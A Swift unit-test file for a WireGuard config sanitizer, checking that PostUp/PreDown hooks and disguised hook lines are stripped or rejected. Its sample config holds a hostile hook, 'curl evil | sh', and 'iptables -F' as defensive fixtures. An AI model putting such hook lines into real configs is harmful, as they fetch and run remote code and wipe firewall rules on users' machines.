import XCTest
@testable import NodensCore

final class WireGuardConfigTests: XCTestCase {
    /// A typical full-tunnel client file (keys are placeholders).
    private let client = """
    [Interface]
    PrivateKey = cHJpdmF0ZWtleXByaXZhdGVrZXlwcml2YXRla2V5MDA=
    Address = 10.8.0.2/32, fd00:8::2/128
    DNS = 10.8.0.1, Corp.Internal, lan
    PostUp = /bin/sh -c 'curl evil | sh'
    PreDown = iptables -F
    SaveConfig = true
    MTU = 1420

    [Peer]
    PublicKey = cHVibGlja2V5cHVibGlja2V5cHVibGlja2V5cHVibDA=
    AllowedIPs = 0.0.0.0/0
    Endpoint = vpn.example.org:51820 # main server
    PersistentKeepalive = 25
    """

    func testClientFile() {
        let report = WireGuardConfig.check(client)
        XCTAssertTrue(report.isUsable, "\(report.problems)")
        XCTAssertEqual(report.addresses, ["10.8.0.2", "fd00:8::2"])
        XCTAssertEqual(report.dnsServers, ["10.8.0.1"])
        XCTAssertEqual(report.dnsDomains, ["corp.internal"])
        XCTAssertEqual(report.ignoredDNS, ["lan"])
        XCTAssertEqual(report.endpoints, ["vpn.example.org:51820"])
        XCTAssertTrue(report.fullTunnelIPv4)
        XCTAssertFalse(report.fullTunnelIPv6)
        XCTAssertEqual(report.removed, ["DNS", "PostUp", "PreDown", "SaveConfig"])
        XCTAssertFalse(report.sanitized.contains("evil"))
        XCTAssertFalse(report.sanitized.contains("iptables"))
        XCTAssertFalse(report.sanitized.lowercased().contains("dns ="))
        // Keys with base64 padding survive whole.
        XCTAssertTrue(report.sanitized.contains("PrivateKey = cHJpdmF0ZWtleXByaXZhdGVrZXlwcml2YXRla2V5MDA="))
    }

    func testRootConfigInjectsTheHookOnly() {
        let report = WireGuardConfig.check(client)
        let root = WireGuardConfig.rootConfig(report, slug: "corp-1a2b", routeStrategy: .scopedDefault)
        let lines = root.components(separatedBy: "\n")
        XCTAssertEqual(lines[0], "[Interface]")
        XCTAssertEqual(
            lines[1],
            "PostUp = NODENS_ROUTE_STRATEGY=scoped-default NODENS_DNS_SERVERS='10.8.0.1' NODENS_DNS_DOMAINS='corp.internal' /usr/local/libexec/nodens/hook wg-up corp-1a2b %i"
        )
        XCTAssertEqual(lines[2], "PreDown = /usr/local/libexec/nodens/hook wg-down corp-1a2b")
        XCTAssertEqual(lines.filter { $0.lowercased().hasPrefix("postup") || $0.lowercased().hasPrefix("predown") }.count, 2)
    }

    func testCaseInsensitiveKeysAndTableOff() {
        let report = WireGuardConfig.check("""
        [interface]
        privatekey = a
        address = 10.0.0.2/24
        table = off
        postup = touch /tmp/x
        [PEER]
        publickey = b
        allowedips = 0.0.0.0/0, ::/0
        """)
        XCTAssertTrue(report.isUsable, "\(report.problems)")
        XCTAssertEqual(report.removed, ["PostUp"])
        XCTAssertFalse(report.fullTunnelIPv4, "Table = off: wg-quick adds no routes")
        XCTAssertFalse(report.fullTunnelIPv6)
    }

    /// wg-quick (bash [[:space:]], C locale) would trim these and run the hook.
    func testDisguisedHooksFailClosed() {
        let base = "[Interface]\nPrivateKey = a\nAddress = 10.0.0.2/32\n%@\n[Peer]\nPublicKey = b\nAllowedIPs = 10.0.0.0/24\n"
        let disguised = [
            "\u{0B}PostUp = touch /tmp/x",
            "\u{0C}PostUp = touch /tmp/x",
            "\rPostUp = touch /tmp/x",
            "PostUp\u{0B}= touch /tmp/x",
            "\u{00A0}PostUp = touch /tmp/x",
            "Post Up = touch /tmp/x",
            "FooBar = touch /tmp/x",
            "touch /tmp/x",
        ]
        for line in disguised {
            let report = WireGuardConfig.check(base.replacingOccurrences(of: "%@", with: line))
            XCTAssertFalse(report.isUsable, "accepted: \(line.debugDescription)")
            XCTAssertFalse(report.sanitized.contains("/tmp/x"), "kept: \(line.debugDescription)")
        }
    }

    func testUnknownPeerKeyAndKeysOutsideSections() {
        XCTAssertFalse(WireGuardConfig.check("PostUp = x\n[Interface]\nPrivateKey = a\nAddress = 10.0.0.2\n[Peer]\nPublicKey = b\n").isUsable)
        XCTAssertFalse(WireGuardConfig.check("[Interface]\nPrivateKey = a\nAddress = 10.0.0.2\n[Peer]\nPublicKey = b\nPostUp = x\n").isUsable)
    }

    func testProblems() {
        XCTAssertEqual(WireGuardConfig.check("").problems.count, 2) // no [Interface], no [Peer]
        let noKeys = WireGuardConfig.check("[Interface]\nAddress = 10.0.0.2/24\n[Peer]\nAllowedIPs = 10.0.0.0/24\n")
        XCTAssertEqual(noKeys.problems, ["[Interface] has no PrivateKey.", "A [Peer] has no PublicKey."])
        XCTAssertTrue(WireGuardConfig.check("[Interface]\nPrivateKey = a\nAddress = 10.0.0.2\n[Peer]\nPublicKey = b\n[Bogus]\n").problems
            .contains("Line 6: unknown section [Bogus]."))
    }
}
